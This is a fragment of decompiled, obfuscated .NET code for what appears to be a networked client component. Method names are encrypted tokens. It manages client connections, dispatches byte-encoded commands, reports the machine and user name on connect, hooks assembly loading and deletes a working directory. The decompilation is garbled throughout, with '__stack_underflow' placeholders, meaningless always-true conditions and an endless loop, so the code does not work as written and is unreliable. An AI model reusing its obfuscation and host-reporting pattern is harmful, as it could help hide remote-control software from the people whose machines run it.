    #=qJRbhy7_BbunS1O6hH3MqZIufpnZboV6cb5Cv4qZI1D0=((Exception)((7 != 0 ? arg2 : arg2)).ExceptionObject);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qjlBNihUiUO2oBJbOEbdB4u8xmfTL9EQ3AEFa$nrdzJY=(object arg1, System.Threading.ThreadExceptionEventArgs arg2)
{
    #=qJRbhy7_BbunS1O6hH3MqZIufpnZboV6cb5Cv4qZI1D0=(((4 != 0 ? arg2 : arg2)).Exception);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qJRbhy7_BbunS1O6hH3MqZIufpnZboV6cb5Cv4qZI1D0=(System.Exception arg1)
{
    try
    {
        if (1 != 0)
        {
        }
    }
    catch (System.Exception ex)
    {
    }
    #=q3_2_t217j7pS3JjemZNI07w3dukMmHXPSE5$LTnvGS8=((-1 != 0 ? arg1 : arg1));
    try
    {
        System.Threading.Thread.Sleep(#=qmzYu_D9f4dvUPauEaU7zvyNjCyGp_73Xn5SffrcfQAU=());
        if (6 != 0)
        {
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q3_2_t217j7pS3JjemZNI07w3dukMmHXPSE5$LTnvGS8=(System.Exception arg1)
{
    string local0;
    string local1;
    string local2;
    object[] local3;

    try
    {
        if (6 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static string #=q4P1tyVDbmSIMgskx0BrPh5ZxjoQy0earrulDSsNhpg8=(string arg1)
{
    string local0;
    object[] local1;

    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(System.IO.File.Exists(local0)))
    {
        return Empty;
    }
    if (7 != 0)
    {
        local1 = __stack_underflow;
    }
    return (String)local1[0];
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qPNzwB3EyeKwH$TwKjEdAjAC6A3IlGhANCdkUFCgvEiw=(string arg1)
{
    string local0;
    System.Exception local1;

    try
    {
        if (8 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qzRcQ_b8FoTlpKT_BObsgBl2bj71wU5HcYdpIIgiTJ5c=()
{
    int local0;
    System.Collections.Generic.List<string> local1;
    int local2;

    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957877));
        if (5 != 0)
        {
            #=q$XxqrIH7dyYqacMzR_CjGA5JAR0vUKiq1f0DFqS1mcI= = __stack_underflow;
        }
    }
    finally
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qHU4s4cJ8BUWy$MQH9LPGxTniDgLcWFlt1CmhZ7PNRWA=(string arg1)
{
    string local0;
    int local1;
    System.Collections.Generic.List<string> local2;

    if (3 != 0)
    {
        local2 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local2);
    try
    {
        if (!System.String.IsNullOrEmpty(arg1))
        {
            if (1 != 0)
            {
                local0 = __stack_underflow;
            }
            if (!(#=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw=.Contains(local0)))
            {
                #=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw=.Add(local0);
            }
            if (1 != 0)
            {
                local1 = __stack_underflow;
            }
            while (true)
            {
                local0 = arg1.Replace(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957763), Microsoft.VisualBasic.CompilerServices.Conversions.ToString(local1));
                if (!(#=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw=.Contains(local0)))
                {
                    #=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw=.Add(local0);
                }
            }
        }
    }
    finally
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static string #=qGCYL9FviWCrv0prWZC8VfgL34V_6XyB$buFX2LkjbCg=()
{
    string local0;
    System.Collections.Generic.List<string> local1;

    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (3 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qDt_4RPbN$YmUyKsVRrbzrjU6uaXWwjHkaZoJAcuFCCs=(string arg1)
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local2;

    if (#=q0yJsLo0aFpSu9ky8R9f$lw== == null)
    {
        return;
    }
    try
    {
        if (7 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    finally
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q7EIL8N8VWglyI984D7TGpzIPvdOcvYIRRwfMeKNyDDs=(string arg1)
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local2;

    if (#=q0yJsLo0aFpSu9ky8R9f$lw== != null)
    {
        if (!(#=qTMXjZFh8G1ehMXQzo1c_k7izR$ZNvDyCJY5aoZ0yOe8=))
        {
            return;
        }
        if (4 != 0)
        {
            #=qjVLlQtRAzKVOtyLrw5PhiGVVmXqMJJOsTT5DxaenWCY= = __stack_underflow;
        }
        try
        {
            if (2 != 0)
            {
                local2 = __stack_underflow;
            }
        }
        finally
        {
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q3eIsVMg85$T5I_yeach_tN$TJG7$vFUaeExZx7tMHps=()
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local2;

    try
    {
        if (8 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    finally
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static System.Reflection.Assembly #=q_FL69pQf17BUSAFbWYu1SStMAbdu$R1GJ8VY8UL5_EA=(object arg1, System.ResolveEventArgs arg2)
{
    System.Reflection.Assembly local0;
    System.Exception local1;

    try
    {
        if (!(!arg2.Name.StartsWith(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957746))))
        {
            if (#=q5MtzoDWNtlkksfPTHs5qXlK2k7ZehKenYzDJQrgdOII= == null)
            {
                if (1 != 0)
                {
                    #=q5MtzoDWNtlkksfPTHs5qXlK2k7ZehKenYzDJQrgdOII= = __stack_underflow;
                }
            }
            if (3 != 0)
            {
                local0 = __stack_underflow;
            }
            return local0;
        }
        return null;
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qFaxhQMbuEyPeOadTfKIzX7ulwKfSulnteVvHU$QDlcs=(Client arg1, string arg2, System.Net.IPAddress arg3)
{
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958173), (-1 != 0 ? arg2 : arg2), (5 != 0 ? arg3 : arg3)));
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qQCd2OoCcjOFxsuzhZKv2M7$UnAX8JX19NdffDxgtv3I=(Client arg1)
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local2;

    if (#=q0yJsLo0aFpSu9ky8R9f$lw== != null)
    {
        try
        {
            if (2 != 0)
            {
                local2 = __stack_underflow;
            }
        }
        finally
        {
        }
    }
    #=qhme1CFqs_evb4VXik7N4x7lNdqSfuNy3r3OUWZ1V4Zk=(true);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qdwmMObmoGgv5eEpelZDrHiipw5mUgryufdcXXig375Q=(Client arg1, System.Exception arg2)
{
    #=qqRc2eOIidDtWq4y7W2lAhSyv$pBRJdAsYlXSRUcwizw=((8 != 0 ? arg2 : arg2), Empty);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qfXdNdmKHZO9pILMTQ4gUIFhfl9KPJm2rU8y_LQsTH4c=(Client arg1, bool arg2)
{
    System.DateTime local0;

    if (!arg2)
    {
        #=qhme1CFqs_evb4VXik7N4x7lNdqSfuNy3r3OUWZ1V4Zk=(false);
        #=qi_z83UuaQZa6UsXCAahbTQ== = MaxValue;
    }
    else
    {
        if (7 != 0)
        {
            #=qo$DZvhC1PKdsChUToY52NA== = __stack_underflow;
        }
        if (8 != 0)
        {
            local0 = __stack_underflow;
        }
        if (-1 != 0)
        {
            #=qi_z83UuaQZa6UsXCAahbTQ== = __stack_underflow;
        }
        #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958106));
        #=quO7UmvJ4RBuIIChSn0jx_M$HL4rBuRuRZnNBEMlpsJw=(#=qFNeaOBvMHuebCbgh$0IKkw==, System.String.Concat(MachineName, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516958136), UserName), #=qZaN94n8dM6tBEf$qCdY2kbTZb5BOW8Z134$2tNv7EJs=(), #=qeD3MBfedCIuKIQf9V1u2N3YS4VXE_FOHqw_XAjWtZK8=());
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qhme1CFqs_evb4VXik7N4x7lNdqSfuNy3r3OUWZ1V4Zk=(bool arg1)
{
    System.Collections.Generic.Dictionary<string, Client>.Enumerator local0;
    System.Collections.Generic.List<string> local1;
    System.Collections.Generic.KeyValuePair<string, Client> local2;

    if (5 != 0)
    {
        #=q1tLM5Gk001IDETj3RhJ2ESaIo2XgaV2vMWhqISqSHy8= = __stack_underflow;
    }
    if (#=q1tLM5Gk001IDETj3RhJ2ESaIo2XgaV2vMWhqISqSHy8= == 3)
    {
        if (2 != 0)
        {
            #=q1tLM5Gk001IDETj3RhJ2ESaIo2XgaV2vMWhqISqSHy8= = __stack_underflow;
        }
        if (7 != 0)
        {
            local1 = __stack_underflow;
        }
        System.Threading.Monitor.Enter(local1);
        try
        {
            if (#=q$XxqrIH7dyYqacMzR_CjGA5JAR0vUKiq1f0DFqS1mcI= != (#=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw=.Count - 1))
            {
                #=q$XxqrIH7dyYqacMzR_CjGA5JAR0vUKiq1f0DFqS1mcI= = #=q$XxqrIH7dyYqacMzR_CjGA5JAR0vUKiq1f0DFqS1mcI= + 1;
            }
            else
            {
                #=qzRcQ_b8FoTlpKT_BObsgBl2bj71wU5HcYdpIIgiTJ5c=();
            }
        }
        finally
        {
        }
    }
    if (!(arg1))
    {
        #=qWcYPgOJASLG6mRBDPhOIZERKO3Eig2IiEWCrUa$w_Mw=(false);
    }
    if (!(!#=qo$DZvhC1PKdsChUToY52NA==))
    {
        #=qo$DZvhC1PKdsChUToY52NA== = false;
        #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958112));
    }
    if (#=qalo3zYdlWWh$dYSx9JnNrw== != null)
    {
        if (#=qalo3zYdlWWh$dYSx9JnNrw==.Count != 0)
        {
            #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958023), #=qalo3zYdlWWh$dYSx9JnNrw==.Count));
        }
        local0 = #=qalo3zYdlWWh$dYSx9JnNrw==.GetEnumerator();
        while (local0.MoveNext())
        {
            local2 = local0.Current;
            local2.Value.#=quOBOxPeAl_kjKKx$REI6dA==();
            continue;
        }
        #=qalo3zYdlWWh$dYSx9JnNrw==.Clear();
    }
    System.Threading.ThreadPool.QueueUserWorkItem(_Lambda$__5);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qWcYPgOJASLG6mRBDPhOIZERKO3Eig2IiEWCrUa$w_Mw=(bool arg1)
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local2;

    if (#=q0yJsLo0aFpSu9ky8R9f$lw== != null)
    {
        try
        {
            if (-1 != 0)
            {
                local2 = __stack_underflow;
            }
        }
        finally
        {
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qraB64nHTnRXCE4d7ffs5aGExarxpEh0COAPaEFI5iV8=(Client arg1, byte[] arg2)
{
    #=qxe_BfLLMHqYa_KBeLsRfpw== local0;

    if (6 != 0)
    {
        local0 = __stack_underflow;
    }
    switch ((&local0).#=qgB3pFGrOVxm7f$sXZD67nQ==)
    {
        case 0:
            #=qYVgYkiAmhdTmisXUMVHYlJUHzcBdggj3Sn3nLI_MDJ4=(local0);
            break;
        case 1:
            #=q0zLeEY98tybLc8FS6iVEWjGp4MNZxETphcH7ohzBXuY=(local0);
            break;
        case 2:
            #=qBeOBlH6CwHFnQdZWWBgZ_pemudZ6CfCVcfOQtgpeG$Y=(local0);
            break;
        default:
            break;
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qJdNCQZ8JQCfthL12ut8Zgnr9$rl3CuJQ4GAn54E6CXs=(Client arg1, byte[] arg2)
{
    #=qbOmsEb0zGpdZukI0D4Idug== local0;
    #=qxe_BfLLMHqYa_KBeLsRfpw== local1;
    System.Exception local2;
    string local3;

    if (7 != 0)
    {
        local1 = __stack_underflow;
    }
    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        if (local0 != null)
        {
            local0.#=qBk9t7p9S5R095rOkFdE8GQ==(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==, (&local1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
        }
        else
        {
            #=qXfm3QhQkyfcZgbFdAZgHHmadm7n1N0mfKcKBqrdfAk4=(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==, local1);
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qyMcWoZuG7jRWeztMnp6fPmxxmqfVgP7DLzGs7HeF4Mo=(Client arg1)
{
    #=qwSqLSPEuM8lJy4sOeuH92YjPodcLquqdG$OodozwC60=((4 != 0 ? arg1 : arg1));
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qZuX180bPJwK7MhIsqenk34Le3ZCQFFLgmBb4sMlYIpg=(Client arg1, bool arg2)
{
    #=qbOmsEb0zGpdZukI0D4Idug== local0;
    System.Exception local1;
    string local2;
    object[] local3;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!arg2)
    {
        #=qwSqLSPEuM8lJy4sOeuH92YjPodcLquqdG$OodozwC60=(arg1);
    }
    else
    {
        if (3 != 0)
        {
            local3 = __stack_underflow;
        }
        local3[0] = arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==;
        local3[1] = arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qHtBOSXbLfhirIdzL218uOQ==;
        #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local3);
        try
        {
            if (local0 != null)
            {
                local0.#=qsA8D04owIGYHILF6yPa43A==(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==);
            }
            else
            {
                #=qcyp860KJctHXULF8nCr1oMRR0y2kU8XZrQHqsInbsAM=(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==);
            }
        }
        catch (System.Exception ex)
        {
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qwSqLSPEuM8lJy4sOeuH92YjPodcLquqdG$OodozwC60=(Client arg1)
{
    #=qbOmsEb0zGpdZukI0D4Idug== local0;
    System.Exception local1;
    string local2;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        if (local0 != null)
        {
            local0.#=q4kB_KjL2oo8adT7lfnt6ew==(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==);
        }
        else
        {
            #=q8NzetUGGc1cM4ZGyRGGlug$fKAOwmcPqe4nFzDGKLk0=(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==);
        }
    }
    catch (System.Exception ex)
    {
    }
    if (!(!#=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qvvhgGCgMlZiK63M2bP1Kcg==()))
    {
        #=qalo3zYdlWWh$dYSx9JnNrw==.Remove(arg1.#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==);
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qudwGeEjJDUB9pt$_k0YOgc30ZWMo1bIGmdknk40OWog=(Client arg1, System.Exception arg2)
{
    #=qqRc2eOIidDtWq4y7W2lAhSyv$pBRJdAsYlXSRUcwizw=((-1 != 0 ? arg2 : arg2), System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958406), ((4 != 0 ? arg1 : arg1)).#=qOWs9MBREWujnaIdYgAI1lg==().#=qKxYY$jYG8_7mT_7R0n5jfw==));
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qcyp860KJctHXULF8nCr1oMRR0y2kU8XZrQHqsInbsAM=(string arg1)
{
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q8NzetUGGc1cM4ZGyRGGlug$fKAOwmcPqe4nFzDGKLk0=(string arg1)
{
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qXfm3QhQkyfcZgbFdAZgHHmadm7n1N0mfKcKBqrdfAk4=(string arg1, #=qxe_BfLLMHqYa_KBeLsRfpw== arg2)
{
    if (!(Microsoft.VisualBasic.CompilerServices.Operators.CompareString((8 != 0 ? arg1 : arg1), #=qGjp0Vb6efONwANkcKrMTkIBxJvr9AleFfJriudyTw3c=, false) != 0))
    {
        #=qBeOBlH6CwHFnQdZWWBgZ_pemudZ6CfCVcfOQtgpeG$Y=((5 != 0 ? arg2 : arg2));
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qhg8oaKg1xx$HC$DKnlbXQpibwH2HXqMGSlGv30vEUsU=(#=qbOmsEb0zGpdZukI0D4Idug== arg1, System.Exception arg2, string arg3)
{
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(Empty);
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958441), ((8 != 0 ? arg1 : arg1)).#=qgCcrNFC0iLB8hKTy5iNnsw==, (-1 != 0 ? arg3 : arg3)));
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958349), ((8 != 0 ? arg2 : arg2)).Message, arg2.StackTrace));
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(Empty);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qqRc2eOIidDtWq4y7W2lAhSyv$pBRJdAsYlXSRUcwizw=(System.Exception arg1, string arg2)
{
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(Empty);
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958395), (0 == 0 ? arg2 : arg2)));
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958349), ((-1 != 0 ? arg1 : arg1)).Message, ((8 != 0 ? arg1 : arg1)).StackTrace));
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(Empty);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q5j3wvJXlnrGmRnKUHr_1SQ==(string arg1)
{
    string local0;
    System.DateTime local1;

    if (#=qxO41EOA8VDczxcMMPD9Hv85pbiPnTbukmYyDI5Z6X8A= || !(!#=q7_KHECinDx5vq1IBX7p8Ow==))
    {
        if (5 != 0)
        {
            arg1 = __stack_underflow;
        }
        if (-1 != 0)
        {
            local1 = __stack_underflow;
        }
        if (__stack_underflow != local1.Day)
        {
            if (!(!#=qxO41EOA8VDczxcMMPD9Hv85pbiPnTbukmYyDI5Z6X8A=))
            {
                #=qxHMqkcY5ri8Rsxs7KCJ8ww==.WriteLine();
                if (2 != 0)
                {
                    local1 = __stack_underflow;
                }
                __stack_underflow.WriteLine(local1.ToLongDateString());
                #=qxHMqkcY5ri8Rsxs7KCJ8ww==.WriteLine();
            }
            if (!(!#=q7_KHECinDx5vq1IBX7p8Ow==))
            {
                System.Console.WriteLine();
                local1 = Now;
                System.Console.WriteLine(local1.ToLongDateString());
                System.Console.WriteLine();
            }
        }
        local0 = System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958297), Now);
        if (!(!#=qxO41EOA8VDczxcMMPD9Hv85pbiPnTbukmYyDI5Z6X8A=))
        {
            #=qxHMqkcY5ri8Rsxs7KCJ8ww==.Write(local0);
            #=qxHMqkcY5ri8Rsxs7KCJ8ww==.WriteLine(arg1);
        }
        if (!(!#=q7_KHECinDx5vq1IBX7p8Ow==))
        {
            System.Console.Write(local0);
            System.Console.WriteLine(arg1);
        }
        #=q8r1xTCj7grAlhMxU0cmrbA== = Now;
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qkxzumuLbzy2O2XsBlM3j$g==(Client arg1, bool arg2, CommandType arg3, byte arg4, object[] arg5)
{
    byte[] local0;
    System.Guid local1;

    if (-1 != 0)
    {
        local0 = __stack_underflow;
    }
    arg1.#=qZRkZQGrnZUWoFBVE_TP$5Q==(local0);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qIrsTmpVUMRgxokIHlpGfmLtKeqxo7vQsjSkKUKFpH4k=(Client arg1, bool arg2, CommandType arg3, byte arg4, System.Guid arg5, object[] arg6)
{
    byte[] local0;

    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    arg1.#=qZRkZQGrnZUWoFBVE_TP$5Q==(local0);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qABSlSWKh$8sT$UF4sG_vQMmKqh5lDRXHlL1yCp0W8x0=(string arg1, bool arg2, CommandType arg3, byte arg4, object[] arg5)
{
    Client local0;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(!#=qalo3zYdlWWh$dYSx9JnNrw==.ContainsKey(arg1)))
    {
        if (6 != 0)
        {
            local0 = __stack_underflow;
        }
        #=qkxzumuLbzy2O2XsBlM3j$g==(local0, arg2, arg3, arg4, arg5);
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qaCmGqb7phy5lq$DAzhK3vB71XCZSvhKm3BtGKq_xBto=()
{
    #=qbbSw65PC$nto6DJiWxTawg== local0;
    System.Exception local1;
    string local2;
    System.Exception local3;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local4;
    int local5;
    string[] local6;

    try
    {
        if (5 != 0)
        {
            local4 = __stack_underflow;
        }
    }
    finally
    {
    }
    #=qxO41EOA8VDczxcMMPD9Hv85pbiPnTbukmYyDI5Z6X8A= = false;
    try
    {
        if (#=qxHMqkcY5ri8Rsxs7KCJ8ww== != null)
        {
            #=qxHMqkcY5ri8Rsxs7KCJ8ww==.Close();
        }
    }
    catch (System.Exception ex)
    {
    }
    local6 = System.IO.Directory.GetFiles(#=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516957763), (System.IO.SearchOption)1);
    local5 = 0;
    while (local5 < checked((int)local6.Length))
    {
        local2 = local6[local5];
        try
        {
            System.IO.File.Delete(local2);
            local5 = local5 + 1;
            continue;
        }
        catch (System.Exception ex)
        {
        }
    }
    try
    {
        System.IO.Directory.Delete(#=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=, true);
        #=qJqkjp9g96yoxpNS2E$BC00FKleto7dZfN9N5mtLDF4g=();
        #=q2WFu5tRyicebO6UkQga8SbXrngw5YigfLTTVJqQy1qI=();
        #=qEn9Mtg$AIqWbq3whj1y5N12e3KXi_NwIIcl2i$FXNSk=(#=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=, 5000);
        #=qEn9Mtg$AIqWbq3whj1y5N12e3KXi_NwIIcl2i$FXNSk=(System.String.Concat(#=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516957129)), 5000);
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q9rN$wEdl9rzJbAMMIiemCg==()
{
    byte[] local0;
    System.Collections.Generic.List<object> local1;
    string local2;
    string local3;
    System.Collections.Generic.KeyValuePair<string, object> local4;
    System.Exception local5;
    int local6;
    System.Collections.Generic.KeyValuePair<string, object>[] local7;

    try
    {
        if (6 != 0)
        {
            #=qjVLlQtRAzKVOtyLrw5PhiGVVmXqMJJOsTT5DxaenWCY= = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qRxR4aJg8TX8oM$OpeoviZQ==(string arg1)
{
    byte[] local0;
    object[] local1;
    int local2;
    string local3;
    object local4;
    System.Exception local5;
    int local6;

    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958244), arg1));
    try
    {
        #=qs4p7qYamgHyRCYZsTKM03Q==.#=q2gthvB62n07fYVTx5fwIqxBAo1t_hs$il9Ac$4FY_Gw=();
        if (!(System.IO.File.Exists(System.IO.Path.Combine(#=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=, arg1))))
        {
            throw new System.Exception(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958705), arg1));
        }
    }
    catch (System.Exception ex)
    {
    }
    #=qTMXjZFh8G1ehMXQzo1c_k7izR$ZNvDyCJY5aoZ0yOe8= = true;
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qxH0vEx09STdEljqb$W1E7jvc94T2TeZBAEeRdiG1_PA=(object arg1)
{
    System.DateTime local0;
    System.TimeSpan local1;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(!#=qjVLlQtRAzKVOtyLrw5PhiGVVmXqMJJOsTT5DxaenWCY=))
    {
        #=q9rN$wEdl9rzJbAMMIiemCg==();
    }
    if (#=q6Xi08r0$lOOnXtoBHhfMuQ== != null)
    {
        if (!(#=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qvvhgGCgMlZiK63M2bP1Kcg==()))
        {
            return;
        }
        if (-1 != 0)
        {
            local1 = __stack_underflow;
        }
        if (local1.TotalMilliseconds >= ((double)#=qXjNBjXFhVcOvrRAG8alfq96_gJ4jOa0wwNOaztY3QjLWnMT6wXGDzBnHuUkef5N0()))
        {
            if (5 != 0)
            {
                #=qyM$eq2QFDjIwNzxtrtw3WE5gHFsUOsREqnRunYWzTvs= = __stack_underflow;
            }
            local1 = local0 - #=qi_z83UuaQZa6UsXCAahbTQ==;
            if (local1.TotalMilliseconds < ((double)#=qXOmEbR_8DUzPz6sW4Kmd6kaKUIQOYZdTpvq2CkB17PTlG1zEUgI_P4skJXU2VwtO()))
            {
                #=q5WXECfTJPQIQ2JoJDGsf9pTFKCPzQGp3$QlyT_g_ZCY=();
            }
            else
            {
                #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=quOBOxPeAl_kjKKx$REI6dA==();
            }
        }
        else
        {
            return;
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qd92UVUgmlXoQZdJDkVvBpfqQ5IrxjaeWORyWFC422PQ=()
{
    uint local0;

    System.Threading.Thread.Sleep(20000);
    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(!#=qmvGJ0E7$XHigSQAtHtZ6z$on2iAwFLBiFtrUR$DFhQPAtVI2LIgzNztIgPvlO9K$()))
    {
        if (0 == 0)
        {
            local0 = __stack_underflow;
        }
    }
    #=qbn24Ox5i732BM_T_R4Q3RtK1pEoSIYmxE9Rba9DDKEA=(local0);
    #=qd92UVUgmlXoQZdJDkVvBpfqQ5IrxjaeWORyWFC422PQ=();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__1(object arg1)
{
    _Lambda$__2.Invoke();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__2()
{
    if (4 != 0)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__3(object arg1)
{
    _Lambda$__4.Invoke();
    return;
}
